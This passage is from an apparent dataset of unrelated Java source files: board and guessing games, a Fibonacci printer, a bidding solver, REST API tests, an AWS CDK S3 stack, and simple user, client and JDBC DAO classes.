mailCards;\r\n    }\r\n\r\n    public List<Card> getDealCards() {\r\n        return dealCards;\r\n    }\r\n}\r\n\r\nclass Board {\r\n    public static final int NUMBER_OF_SPACES = 31; // Including start and end spaces\r\n    private static final String[] SPACE_ACTIONS = {\r\n        \"Start\", \"Payday\", \"Deal\", \"Mail\", \"Bills\", \"Lottery\", \"Deal\", \"Mail\", \"Bills\", \"Charity\", \"Deal\", \"Mail\",\r\n        \"Bills\", \"Deal\", \"Mail\", \"Bills\", \"Deal\", \"Mail\", \"Deal\", \"Mail\", \"Deal\", \"Mail\", \"Bills\", \"Deal\", \"Mail\",\r\n        \"Bills\", \"Deal\", \"Mail\", \"Payday\", \"End\"\r\n    };\r\n\r\n    public static String getSpaceAction(int position) {\r\n        return SPACE_ACTIONS[position];\r\n    }\r\n}\r\n\r\nabstract class Card {\r\n    private String description;\r\n\r\n    public Card(String description) {\r\n        this.description = description;\r\n    }\r\n\r\n    public String getDescription() {\r\n        return description;\r\n    }\r\n\r\n    public abstract void performAction(Player player);\r\n}\r\n\r\nclass MailCard extends Card {\r\n    public MailCard(String description) {\r\n        super(description);\r\n    }\r\n\r\n    @Override\r\n    public void performAction(Player player) {\r\n        Random random = new Random();\r\n        int amount = random.nextInt(500) + 100; // Generate a random amount between $100 and $600\r\n\r\n        player.deductCash(amount);\r\n        System.out.println(\"You lost $\" + amount + \" due to the mail card.\");\r\n    }\r\n}\r\n\r\nclass DealCard extends Card {\r\n    public DealCard(String description) {\r\n        super(description);\r\n    }\r\n\r\n    @Override\r\n    public void performAction(Player player) {\r\n        Random random = new Random();\r\n        int amount = random.nextInt(1000) + 500; // Generate a random amount between $500 and $1500\r\n\r\n        player.addCash(amount);\r\n        System.out.println(\"You gained $\" + amount + \" from the deal card.\");\r\n    }\r\n}\r\n\r\nclass Dice {\r\n    private static final Random random = new Random();\r\n\r\n    public static int roll() {\r\n        return random.nextInt(6) + 1; // Rolling a 6-sided die\r\n    }\r\n}\r\n\r\npublic class PaydayGame {\r\n    private static List<Player> players; // Make players static\r\n    private int currentTurn;\r\n\r\n    public PaydayGame(int numberOfPlayers) {\r\n        players = new ArrayList<>();\r\n        for (int i = 1; i <= numberOfPlayers; i++) {\r\n            Player player = new Player(\"Player \" + i, 3500); // Starting cash $3500\r\n            players.add(player);\r\n        }\r\n        currentTurn = 0;\r\n    }\r\n\r\n    public void startGame() {\r\n    Scanner scanner = new Scanner(System.in);\r\n    System.out.println(\"Welcome to Payday Game!\");\r\n    System.out.println(\"Let's get started.\\n\");\r\n\r\n    System.out.print(\"Enter the number of months to play: \");\r\n    int months = scanner.nextInt();\r\n    int daysInMonth = 30; // Assuming 30 days in each month for simplicity\r\n\r\n    // Game loop for each month\r\n    for (int month = 1; month <= months; month++) {\r\n        System.out.println(\"\\nMonth \" + month + \" begins!\");\r\n\r\n        // Loop for each day in the month\r\n        for (int day = 1; day <= daysInMonth; day++) {\r\n            System.out.println(\"Day \" + day);\r\n\r\n            // Player turns loop for each day\r\n            for (Player player : players) {\r\n                currentTurn++;\r\n                System.out.println(\"\\n\" + player.getName() + \"'s turn (Turn \" + currentTurn + \")\");\r\n                System.out.println(\"Current Cash Balance: $\" + player.getCashBalance());\r\n                System.out.println(\"Current Position: \" + player.getCurrentPosition());\r\n\r\n",
    "package br.com.alura.bytebank.domain.cliente;\n\nimport java.time.LocalDate;\nimport java.util.Objects;\n\npublic class Cliente {\n\n    private String nome;\n    private String cpf;\n    private String email;\n\n    public Cliente(DadosCadastroCliente dados) {\n        this.nome = dados.nome();\n        this.cpf = dados.cpf();\n        this.email = dados.email();\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Cliente cliente = (Cliente) o;\n        return cpf.equals(cliente.cpf);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(cpf);\n    }\n\n    @Override\n    public String toString() {\n        return \"Cliente{\" +\n                \"nome='\" + nome + '\\'' +\n                \", cpf='\" + cpf + '\\'' +\n                \", email='\" + email + '\\'' +\n                '}';\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public String getCpf() {\n        return cpf;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n}\n",
    "import java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Random;\nimport java.util.Set;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.Map.Entry;\nimport java.util.stream.Collectors;\nimport java.util.Collections;\nimport java.util.Comparator;\n\nimport org.json.simple.*;\nimport org.json.simple.parser.*;\n\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.math.BigDecimal;\npublic class GreedySolver extends Solver{\n\n    private List<Double> offered_prices_of_bids;\n    private HashMap<String, Double> amount_of_requested_resources_mapped_to_phymachines;\n    public double total_price;\n    public double total_idle_cost;\n    public double total_utilization_cost;\n    public GreedySolver(List<Object> bids,int sortingMethod, int dimension, int numberOfDataCenters,\n    HashMap<Integer, Integer> dataCentersPhysicalMachines, List<List<Integer>> physicalMachines,\n            List<List<Double>> physicalMachineIdleFullEnergyCosts,List<Double> dataCenterEnergyCosts,List<List<Integer>> phyResourceCapacities,int index) {\n        super(bids,sortingMethod, dimension, numberOfDataCenters, dataCentersPhysicalMachines, physicalMachines,\n                physicalMachineIdleFullEnergyCosts,dataCenterEnergyCosts,phyResourceCapacities,index);\n\n        this.offered_prices_of_bids=this.calculate_bids_prices(); \n        this.amount_of_requested_resources_mapped_to_phymachines=new HashMap<String,Double>()   ;   \n        this.total_price=new Double(0);\n        this.total_idle_cost=new Double(0);\n        this.total_utilization_cost=new Double(0);\n        JsonArray bidss=(JsonArray)this.bids.get(0);   \n        for(int k=0;k<bidss.size();k++)\n        {\n          ArrayList<Object> bidArray=(ArrayList<Object>) bidss.get(k); \n          int amountOfSubbids=bidArray.size()-1;\n          for(int l=0;l<amountOfSubbids;l++)\n          {\n              ArrayList<Object> subbidArray=(ArrayList<Object>)   bidArray.get(l);\n              int amount_of_substituble_resources = subbidArray.size()-1;\n                for(int m=0;m<amount_of_substituble_resources;m++)\n                {\n                    for(int i=0;i<physicalMachines.size();i++)\n                    {\n                      \n                      String str_key=Integer.toString(k) +\"-\"+Integer.toString(l) +\"-\"+Integer.toString(m) +\"-\"+Integer.toString(i) ;\n                      this.amount_of_requested_resources_mapped_to_phymachines.put(str_key, new Double(0));\n                    } \n                }  \n          }\n      \n     \n        }\n\n       \n    }\n\n   \n    public double determineBidProfitByProfitperunitAndEnergyCostForAntColony(Object bid)\n    {\n      for(int a=0;a<this.dimension;a++)\n      {\n            for (List<Integer> machine : this.physicalMachines) {\n              this.phyMachineAllCapacities.add(machine.get(a));\n          }\n      }\n         \n     for (int i=0;i<this.phyMachineAllCapacities.size()-this.physicalMachines.size()+1;i+=this.physicalMachines.size())\n     {\n      this.phyMachineCapacitiesByFeatures.add(this.phyMachineAllCapacities.subList(i, i+this.physicalMachines.size()));\n     }  \n\n      ArrayList<Object> bidArray=(ArrayList<Object>) bid;  \n      int lengthOfBid=bidArray.size();\n      double pricePerUnit=this.determineBidProfitByProfitperunit(bid);\n      double sumOfReplacableCpus=0;\n      double totalCpu =0;\n      \n      for (int i=0; i<lengthOfBid-1; i++ )\n      {\n          ArrayList<Object> subbidArray=(ArrayList<Object>)   bidArray.get(i);\n          int lengthOfSubbid= subbidArray.size();\n          sumOfReplacableCpus=0;\n          for (int j=0; j<lengthOfSubbid-1;j++)\n          {\n            ArrayList<Object> partsOfSubbid=(ArrayList<Object>)   subbidArray.get(j) ;\n            BigDecimal valueBD = (BigDecimal) partsOfSubbid.get(0);\n            BigDecimal value2= (BigDecimal) subbidArray.get(lengthOfSubbid-1);\n            double normalizedCapValue=this.normalizeCapacityValue((valueBD.intValue())*(value2.intValue()), 0);\n            sumOfReplacableCpus=sumOfReplacableCpus+normalizedCapValue;\n          }\n          \n          double averageOfSubbid= sumOfReplacableCpus/(lengthOfSubbid-1);\n          totalCpu=totalCpu+averageOfSubbid;\n\n      }\n\n      List<Double> energyCosts=new ArrayList<Double>();\n\n          for(int x=0;x<this.physicalMachines.size();x++)\n          {\n            double energyCostForPhysicalMachine=this.determineEnergyCostForSinglePhysicalMachine(totalCpu,x)  ;\n            energyCosts.add(energyCostForPhysicalMachine);\n          }\n      \n          double sumOfEnergyCosts=0;\n      for (double sum:energyCosts)\n      {\n        sumOfEnergyCosts=sumOfEnergyCosts+sum;\n      }\n\n      double averageOfEnergyCosts=sumOfEnergyCosts/energyCosts.size()  ;    \n      \n      return pricePerUnit-averageOfEnergyCosts;\n\n    \n    }\n\n    public HashMap<Integer, Double> sortBids() throws FileNot",
    "import java.util.Scanner;\n\npublic class fibonacci3 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter the number of Fibonacci elements to be printed:\");\n        int n = scanner.nextInt();\n\n        System.out.println(\"Choose output format:\");\n        System.out.println(\"1. Numeric\");\n        System.out.println(\"2. Words\");\n        System.out.print(\"Choice: \");\n        int choice = scanner.nextInt();\n\n        FibonacciGenerator fibonacciGenerator;\n        if (choice == 1) {\n            fibonacciGenerator = new NumericFibonacciGenerator();\n        } else {\n            fibonacciGenerator = new WordFibonacciGenerator();\n        }\n\n        fibonacciGenerator.generateFibonacci(n);\n    }\n}\n\nclass FibonacciGenerator {\n    public void generateFibonacci(int n) {\n        int a = 0, b = 1;\n        System.out.println(\"Fibonacci series:\");\n        for (int i = 0; i < n; i++) {\n            System.out.print(a + \" \");\n            int temp = a + b;\n            a = b;\n            b = temp;\n        }\n    }\n}\n\nclass NumericFibonacciGenerator extends FibonacciGenerator {\n    @Override\n    public void generateFibonacci(int n) {\n        super.generateFibonacci(n);\n    }\n}\n\nclass WordFibonacciGenerator extends FibonacciGenerator {\n    @Override\n    public void generateFibonacci(int n) {\n        System.out.println(\"\\nFibonacci series in words:\");\n        for (int i = 0; i < n; i++) {\n            String word = NumberWords.convertNumberToWords(calculateFibonacci(i));\n            if (i != 0) {\n                System.out.print(\", \");\n            }\n            System.out.print(word);\n        }\n    }\n\n    private int calculateFibonacci(int n) {\n        if (n <= 1)\n            return n;\n        int fib = 1;\n        int prevFib = 1;\n        for (int i = 2; i < n; i++) {\n            int temp = fib;\n            fib += prevFib;\n            prevFib = temp;\n        }\n        return fib;\n    }\n}\n\nclass NumberWords {\n    private static final String[] units = {\"\", \"One\", \"Two\", \"Three\", \"Four\", \"Five\", \"Six\", \"Seven\", \"Eight\", \"Nine\"};\n    private static final String[] teens = {\"\", \"Eleven\", \"Twelve\", \"Thirteen\", \"Fourteen\", \"Fifteen\", \"Sixteen\", \"Seventeen\", \"Eighteen\", \"Nineteen\"};\n    private static final String[] tens = {\"\", \"Ten\", \"Twenty\", \"Thirty\", \"Forty\", \"Fifty\", \"Sixty\", \"Seventy\", \"Eighty\", \"Ninety\"};\n\n    public static String convertNumberToWords(int number) {\n        if (number == 0) {\n            return \"Zero\";\n        }\n        return convertNumber(number).trim();\n    }\n\n    private static String convertNumber(int number) {\n        if (number < 0) {\n            return \"Negative \" + convertNumber(-number);\n        }\n        if (number < 10) {\n            return units[number];\n        }\n        if (number < 20) {\n            return teens[number - 10];\n        }\n        if (number < 100) {\n            return tens[number / 10] + \"-\" + units[number % 10];\n        }\n        return \"Number too large to convert\";\n    }\n}",
    "package stepdefinitions;\r\n\r\nimport io.cucumber.cienvironment.internal.com.eclipsesource.json.JsonObject;\r\nimport io.cucumber.java.en.And;\r\nimport io.cucumber.java.en.Given;\r\nimport io.cucumber.java.en.Then;\r\nimport io.cucumber.java.en.When;\r\nimport io.restassured.RestAssured;\r\nimport io.restassured.path.json.JsonPath;\r\nimport io.restassured.response.Response;\r\nimport io.restassured.response.ResponseBody;\r\nimport io.restassured.specification.RequestSpecification;\r\nimport static org.junit.Assert.*;\r\nimport org.json.simple.JSONObject;\r\n\r\npublic class Products {\r\n    public RequestSpecification httpuReqest;\r\n    public Response response;\r\n    public int ResponseCode;\r\n    public int StatusCode;\r\n    public ResponseBody body ;\r\n    public String s;\r\n\r\n    public  JSONObject requestParams;\r\n\r\n    @Given(\"I hit the url of get products api endpoint\")\r\n    public void I_hit_the_url_of_get_products_api_endpoint()\r\n    {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n    }\r\n\r\n    @When(\"I pass the url of products in  the request\")\r\n    public void I_pass_the_url_of_products_in_the_request()\r\n    {\r\n        httpuReqest = RestAssured.given();\r\n        response = httpuReqest.get(\"products\");\r\n    }\r\n\r\n    @Then(\"I received the response code as {int}\")\r\n    public void I_received_the_response_code_as(Integer int1)\r\n    {\r\n        ResponseCode = response.getStatusCode();\r\n        assertEquals(ResponseCode,200);\r\n\r\n    }\r\n\r\n    @Then(\"I verify that the rate of the first product is {}\")\r\n    public void I_verify_that_the_rate_of_the_first_product_is_(String rate)\r\n    {\r\n        body = response.getBody();\r\n        // convert response body to string\r\n        String responseBody = body.asString();\r\n\r\n        //JSON Representation from Response Body\r\n        JsonPath jsnpath = response.jsonPath();\r\n        String s = jsnpath.getJsonObject(\"rating[0].rate\").toString();\r\n\r\n        assertEquals(rate, s);\r\n\r\n\r\n    }\r\n\r\n    @Given(\"I hit the url of post  product api endpoint\")\r\n    public void iHitTheUrlOfPostProductApiEndpoint() {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        httpuReqest=RestAssured.given();\r\n        requestParams = new JSONObject();\r\n\r\n\r\n\r\n\r\n\r\n    }\r\n\r\n    @And(\"I pass the request body of product title {}\")\r\n    public void iPassTheRequestBodyOfProductTitle(String title)\r\n    {\r\n        requestParams.put(\"title\",title);\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        Response response = httpuReqest.post(\"products\");\r\n        ResponseBody body = response.getBody();\r\n        JsonPath jsnpath = response.jsonPath();\r\n        s= jsnpath.getJsonObject(\"id\").toString();\r\n        System.out.println(response.getStatusLine());\r\n        System.out.println(body.asString());\r\n\r\n    }\r\n\r\n    @Then(\"I received the response body with id as {}\")\r\n    public void iReceivedTheResponseBodyWithIdAs(String id)\r\n    {\r\n        assertEquals(id,s);\r\n    }\r\n\r\n    @Given(\"I hit the url of put  product api endpoint\")\r\n    public void iHitTheUrlOfPutProductApiEndpoint()\r\n    {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        requestParams = new JSONObject();\r\n\r\n    }\r\n\r\n    @When(\"I pass the url of products in  the request with {}\")\r\n    public void iPassTheUrlOfProductsInTheRequestWith(String productnumber) {\r\n        httpuReqest = RestAssured.given();\r\n        requestParams.put(\"title\",\"test product\");\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        response = httpuReqest.put(\"products/\"+productnumber);\r\n        ResponseBody body = response.getBody();\r\n        JsonPath jsnpath = response.jsonPath();\r\n        System.out.println(response.getStatusLine());\r\n        System.out.println(body.asString());\r\n\r\n    }\r\n\r\n\r\n    @Given(\"I hit the url of delete  product api endpoint\")\r\n    public void iHitTheUrlOfDeleteProductApiEndpoint() {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        requestParams = new JSONObject();\r\n\r\n    }\r\n\r\n    @When(\"I pass the url of delete products in  the request with {}\")\r\n    public void iPassTheUrlOfDeleteProductsInTheRequestWith(String productnumber) {\r\n\r\n        httpuReqest = RestAssured.given();\r\n        requestParams.put(\"title\",\"test product\");\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        response = httpuReqest.delete(\"products/\"+produ",
    "import javax.swing.JFrame;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.JButton;\r\nimport javax.swing.JTextField;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JComboBox;\r\nimport javax.swing.ImageIcon;\r\nimport javax.swing.JOptionPane;\r\nimport javax.swing.SwingUtilities;\r\nimport javax.swing.border.EmptyBorder;\r\n\r\nimport java.awt.Color;\r\nimport java.awt.Font;\r\nimport java.awt.GridLayout;\r\nimport java.awt.BorderLayout;\r\n\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.util.Random;\r\n\r\npublic class RandomNumberGame extends JFrame {\r\n    private JButton playButton, checkButton;\r\n    private JTextField numberField;\r\n    private JComboBox<String> difficultyComboBox;\r\n    private JLabel messageLabel, hintLabel;\r\n\r\n    private JPanel mainPanel;\r\n\r\n    final static private String APP_TITLE = \"Random Guess\";\r\n    \r\n    final static private Font BUTTON_FONT = new Font(\"verdana\", Font.BOLD, 12);\r\n    final static private Font HINT_FONT = new Font(\"verdana\", Font.BOLD, 13);\r\n    final static private Font NUMBER_FIELD_FONT = new Font(\"arial\", Font.BOLD,14);\r\n    final static private Font MESSAGE_LABEL_FONT = new Font(\"arial\", Font.BOLD, 14);\r\n\r\n    final static private Color BG_COLOR = new Color(24, 200, 216);\r\n\r\n    final static private Color BG_PLAY_BUTTON_COLOR = new Color(229, 255, 249);\r\n    final static private Color FORE_PLAY_BUTTON_COLOR = new Color(0, 68, 158);\r\n\r\n    final static private Color BG_CHECK_BUTTON_COLOR= new Color(0 ,194 ,0);\r\n    final static private Color FORE_CHECK_BUTTON_COLOR= new Color(255,255,255);\r\n\r\n    final static private Color BG_COMBOBOX_COLOR = new Color(24 , 211 , 214);\r\n    final static private Color FORE_COMBOBOX_COLOR= new Color(0, 68, 158);\r\n\r\n    private int randomNumber;\r\n    private int chancesLeft = 2;\r\n\r\n    private int min = 0;\r\n    private int max = 0;\r\n\r\n    public RandomNumberGame() {\r\n        setTitle(RandomNumberGame.APP_TITLE);\r\n        setSize(500, 400);\r\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n        setLocationRelativeTo(null);\r\n        setIconImage(new ImageIcon(\"icon.png\").getImage());\r\n        getContentPane().setBackground(RandomNumberGame.BG_COLOR);\r\n\r\n        this.mainPanel = new JPanel();\r\n        this.mainPanel.setBackground(RandomNumberGame.BG_COLOR);\r\n        this.mainPanel.setLayout(new GridLayout(6, 1,10,10));\r\n        this.mainPanel.setBorder(new EmptyBorder(10,30,10,30));\r\n\r\n        playButton = new JButton(\"PLAY\");\r\n        playButton.setFont(RandomNumberGame.BUTTON_FONT);\r\n        playButton.setBackground(RandomNumberGame.BG_PLAY_BUTTON_COLOR);\r\n        playButton.setForeground(RandomNumberGame.FORE_PLAY_BUTTON_COLOR);\r\n        playButton.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                playButtonClicked();\r\n            }\r\n        });\r\n        mainPanel.add(playButton, BorderLayout.CENTER);\r\n\r\n        difficultyComboBox = new JComboBox<>();\r\n        difficultyComboBox.addItem(\"Easy\");\r\n        difficultyComboBox.addItem(\"Medium\");\r\n        difficultyComboBox.addItem(\"Hard\");\r\n\r\n        difficultyComboBox.setFont(RandomNumberGame.BUTTON_FONT);\r\n        difficultyComboBox.setBackground(RandomNumberGame.BG_COMBOBOX_COLOR );\r\n        difficultyComboBox.setForeground(RandomNumberGame.FORE_COMBOBOX_COLOR);\r\n        mainPanel.add(difficultyComboBox);\r\n\r\n        numberField = new JTextField(10);\r\n        numberField.setFont(RandomNumberGame.NUMBER_FIELD_FONT);\r\n        numberField.setVisible(false);\r\n        mainPanel.add(numberField);\r\n\r\n        checkButton = new JButton(\"CHECK\");\r\n        checkButton.setVisible(false);\r\n        checkButton.setFont(RandomNumberGame.BUTTON_FONT);\r\n        checkButton.setBackground(RandomNumberGame.BG_CHECK_BUTTON_COLOR);\r\n        checkButton.setForeground(RandomNumberGame.FORE_CHECK_BUTTON_COLOR);\r\n        checkButton.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                checkButtonClicked();\r\n            }\r\n        });\r\n        mainPanel.add(checkButton);\r\n\r\n        messageLabel = new JLabel();\r\n        messageLabel.setFont(RandomNumberGame.MESSAGE_LABEL_FONT);\r\n        mainPanel.add(messageLabel);\r\n\r\n        hintLabel = new JLabel();\r\n        hintLabel.setForeground(RandomNumberGame.FORE_PLAY_BUTTON_COLOR);\r\n        hintLabel.setFont(RandomNumberGame.HINT_FONT);\r\n        hintLabel.setVisible(false);\r\n\r\n        mainPanel.add(hintLabel);\r\n\r\n        add(mainPanel);\r\n    }\r\n\r\n    private void playButtonClicked() {\r\n        String difficulty = (String) difficultyComboBox.getSelectedItem();\r\n        if (difficulty.equals(\"Easy\")) {\r\n            randomNumber = generateRandomNumber(1, 10);\r\n            chancesLeft = 2;\r\n        } else if (difficulty.equals(\"Medium\")) {\r\n            randomNumber = generateRandomNumber(1, 25);\r\n            chancesLeft = 3;\r\n        } else if (difficulty.equals(\"Hard\")) {\r\n   ",
    "package com.myorg;\n\nimport software.amazon.awscdk.CfnOutput;\nimport software.amazon.awscdk.RemovalPolicy;\nimport software.amazon.awscdk.services.iam.ManagedPolicy;\nimport software.amazon.awscdk.services.iam.Role;\nimport software.amazon.awscdk.services.iam.ServicePrincipal;\nimport software.amazon.awscdk.services.s3.BlockPublicAccess;\nimport software.amazon.awscdk.services.s3.Bucket;\nimport software.amazon.awscdk.services.s3.BucketEncryption;\nimport software.amazon.awscdk.services.s3.BucketProps;\nimport software.amazon.awscdk.services.s3.CfnBucket;\nimport software.amazon.awscdk.services.s3.CfnBucket.ReplicationConfigurationProperty;\nimport software.amazon.awscdk.services.s3.CfnBucket.ReplicationDestinationProperty;\nimport software.amazon.awscdk.services.s3.CfnBucket.ReplicationRuleProperty;\nimport software.constructs.Construct;\n\nimport java.util.List;\n\n\npublic class S3BucketStack extends Construct {\n    private final Bucket bucket;\n    public S3BucketStack(final Construct parent, final String id) {\n        this(parent, id, null);\n    }\n\n    public S3BucketStack(final Construct parent, final String id, final BucketProps props) {\n        super(parent,id);\n\n        bucket = Bucket.Builder.create(this, \"Bucket\")\n                .bucketName(Multiregionwithextendedlib.BUCKET_NAME)\n                .encryption(BucketEncryption.S3_MANAGED)\n                .versioned(true)\n                .removalPolicy(RemovalPolicy.DESTROY)\n                .blockPublicAccess(BlockPublicAccess.BLOCK_ALL)\n                .build();\n\n        Role replicationRole = Role.Builder.create(this, \"ReplicationRole\")\n                .assumedBy(new ServicePrincipal(\"s3.amazonaws.com\"))\n                .build();\n\n        replicationRole.addManagedPolicy(ManagedPolicy.fromAwsManagedPolicyName(\"AmazonS3FullAccess\")); //only for test purpose\n\n        ReplicationConfigurationProperty replicationConfigurationProperty = ReplicationConfigurationProperty.builder()\n                .role(replicationRole.getRoleArn())\n                .rules(List.of(ReplicationRuleProperty.builder()\n                        .destination(ReplicationDestinationProperty.builder()\n                                .bucket(\"arn:aws:s3:::\"+ Multiregionwithextendedlib.BUCKET_NAME+\"-secondary\")\n                                .build())\n                        .status(\"Enabled\")\n                        .build()))\n                .build();\n\n        ((CfnBucket)bucket.getNode().getDefaultChild()).setReplicationConfiguration(replicationConfigurationProperty);\n\n        CfnOutput.Builder.create(this, \"BucketName\")\n                .value(bucket.getBucketName())\n                .exportName(\"BucketName\")\n                .build();\n    }\n\n    public Bucket getBucket() {\n        return bucket;\n    }\n\n\n}\n",
    "import java.util.Scanner;\n\npublic class RedeSocial {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        final int CRIAR_CONTA = 1;\n        final int LOGAR_NA_CONTA = 2;\n        final int CRIAR_POST = 1;\n        final int SEGUIR_USUARIO = 2;\n        final int EXIBIR_MURAL = 3;\n\n        int opcao = 1;\n        String nomeUsuario = \"\";\n\n        Mural mural = new Mural();\n        System.out.println(\"BEM VINDO AO GRANDE PAPAGAIO\");\n        do {\n            menuInicial();\n\n            opcao = sc.nextInt();\n            sc.nextLine();\n\n            if (opcao == CRIAR_CONTA) {\n                System.out.println(\"Digite seu nome:\");\n                String nome = sc.nextLine();\n\n                Usuario novoUsuario = new Usuario(nome);\n                String criarConta = mural.criarUsuarios(novoUsuario);\n\n                System.out.println(criarConta);\n\n            } else if (opcao == LOGAR_NA_CONTA) {\n                System.out.println(\"Digite seu nome:\");\n                nomeUsuario = sc.nextLine();\n                try {\n                    Usuario usuarioAtual = mural.logarUsuario(nomeUsuario);\n                    if (usuarioAtual.getNome().equalsIgnoreCase(nomeUsuario)) {\n                        System.out.println(\"Usu\u00e1rio Encontrado!\");\n\n                        do {\n                            menuOpcoes();\n                            opcao = sc.nextInt();\n                            sc.nextLine();\n\n                            switch (opcao) {\n                                case CRIAR_POST:\n                                    System.out.println(\"Digite seu post:\");\n                                    String post = sc.nextLine();\n\n                                    String adicionaPost = mural.postarNoMural(usuarioAtual, post);\n                                    System.out.println(adicionaPost);\n\n                                    break;\n\n                                case SEGUIR_USUARIO:\n                                    System.out.println(\"Digite o nome do usu\u00e1rio:\");\n                                    String seguirUsuario = sc.nextLine();\n\n                                    String seguir = mural.seguirUsuarios(usuarioAtual, seguirUsuario);\n                                    System.out.println(seguir);\n                                    break;\n\n                                case EXIBIR_MURAL:\n                                    StringBuilder exibir = mural.lerMural(usuarioAtual);\n                                    System.out.println(exibir);\n                                    break;\n\n                                case 4:\n                                    System.out.println(\"Voc\u00ea saiu da sua conta.\");\n                                    usuarioAtual = null;\n                                    break;\n                            }\n\n                        } while (opcao != 4);\n                    }\n                } catch (Exception e) {\n                    System.out.println(e.getMessage());\n                }\n            }\n        } while (opcao != 3);\n    }\n    public static void menuInicial() {\n        System.out.println(\"Digite uma das op\u00e7\u00f5es para continuar:\");\n        System.out.println(\"1 - Criar uma conta. \\n2 - Logar em uma conta.\");\n        System.out.println(\"3 - Para sair\");\n    }\n    public static void menuOpcoes() {\n        System.out.println(\"Digite uma das op\u00e7\u00f5es para continuar:\");\n        System.out.println(\"1 - Criar Post\\n2 - Seguir Pessoas \");\n        System.out.println(\"3 - Exibir Mural \\n4 - Para sair\");\n    }\n}\n",
    "package com.userManagement;\n\npublic class User {\n    protected int id;\n    protected String name;\n    protected String email;\n    protected String country;\n\n    public User() {\n    }\n    public User(String name, String email, String country) {\n        this.name = name;\n        this.email = email;\n        this.country = country;\n    }\n    public User(int id, String name, String email, String country) {\n        this.id = id;\n        this.name = name;\n        this.email = email;\n        this.country = country;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public String getCountry() {\n        return country;\n    }\n\n    public void setCountry(String country) {\n        this.country = country;\n    }\n\n    public int getId() {return id;}\n\n    public void setId(int id) {\n        this.id = id;\n    }\n}\n",
    "package jm.task.core.jdbc.dao;\r\n\r\nimport java.sql.*;\r\n\r\nimport jm.task.core.jdbc.model.User;\r\nimport jm.task.core.jdbc.util.Util;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\n\r\npublic class UserDaoJDBCImpl  implements UserDao {\r\n\r\n\r\n        private static final Connection connection = Util.getConnection();\r\n\r\n        public UserDaoJDBCImpl() {\r\n\r\n        }\r\n\r\n\r\n    public void createUsersTable()  {\r\n        String creatSQL = \"CREATE TABLE IF NOT EXISTS user (Id BIGINT PRIMARY KEY AUTO_INCREMENT, Name VARCHAR(20), LastName VARCHAR(20), Age TINYINT)\";\r\n        try (PreparedStatement preparedStatement = connection.prepareStatement(creatSQL)\r\n        ) {\r\n            preparedStatement.executeUpdate();\r\n\r\n        } catch (SQLException  e) {\r\n            e.printStackTrace();\r\n        }\r\n//\r\n    }\r\n\r\n    public void dropUsersTable() {\r\n        String dropTable = \"DROP TABLE IF EXISTS user\";\r\n        try (PreparedStatement preparedStatement = connection.prepareStatement(dropTable)\r\n        ){\r\n            preparedStatement.executeUpdate();\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n    }\r\n\r\n    public void saveUser(String name, String lastName, byte age)  {\r\n        String saveSQL = \"INSERT INTO user ( NAME, LASTNAME, AGE) VALUES ( ?, ?, ?)\";\r\n        try(PreparedStatement preparedStatement = connection.prepareStatement(saveSQL)\r\n        ) {\r\n\r\n            preparedStatement.setString(1, name);\r\n            preparedStatement.setString(2, lastName);\r\n            preparedStatement.setByte(3, age);\r\n\r\n            preparedStatement.executeUpdate();\r\n            System.out.println(\"User \u0441 \u0438\u043c\u0435\u043d\u0435\u043c \" + name + \" \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u0431\u0430\u0437\u0443 \u0434\u0430\u043d\u043d\u044b\u0445\");\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n    }\r\n\r\n    public void removeUserById(long id) {\r\n        String removeUserId = \"DELETE FROM user WHERE Id = ?\";\r\n        try(PreparedStatement preparedStatement = connection.prepareStatement(removeUserId)\r\n        ) {\r\n\r\n            preparedStatement.setInt(1, (int) id);\r\n            preparedStatement.executeUpdate();\r\n        }   catch (SQLException  e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public List<User> getAllUsers()  {\r\n        List<User> userList = new 